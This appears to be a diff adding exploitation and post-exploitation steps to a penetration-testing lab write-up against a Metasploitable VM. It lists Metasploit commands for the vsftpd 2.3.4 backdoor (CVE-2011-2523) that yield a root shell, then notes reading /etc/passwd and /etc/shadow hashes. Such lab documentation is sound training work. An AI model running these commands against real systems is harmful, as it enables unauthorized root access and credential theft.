@@ -41,3 +41,40 @@ nmap --script ftp-anon,ftp-syst -p 21 10.0.2.4
 - Connected with: ftp 10.0.2.4
 - Username: anonymous / Password: anything
 - Result: 230 Login successful
+
+
+## Step 4 — Exploitation
+
+### Tool: Metasploit Framework
+### Module: exploit/unix/ftp/vsftpd_234_backdoor
+### CVE: CVE-2011-2523
+
+### Commands used
+- use exploit/unix/ftp/vsftpd_234_backdoor
+- set RHOSTS 10.0.2.4
+- run
+
+### Result
+- Backdoor triggered on port 6200
+- Root shell obtained immediately
+- Session: 10.0.2.15:46565 -> 10.0.2.4:6200
+- No credentials required
+
+## Step 5 — Post-Exploitation
+
+### System info
+- OS: Linux metasploitable 2.6.24 (2008 kernel)
+- Hostname: metasploitable
+- Current user: root (uid=0)
+
+### Findings
+1. /etc/passwd readable — 30+ accounts listed
+   Real users: msfadmin, user, service, postgres
+
+2. /etc/shadow readable — password hashes exposed
+   root, msfadmin, user, service all have crackable hashes
+   Severity: CRITICAL
+
+3. Home directories: ftp, msfadmin, service, user
+
+4. Target IP confirmed: 10.0.2.4
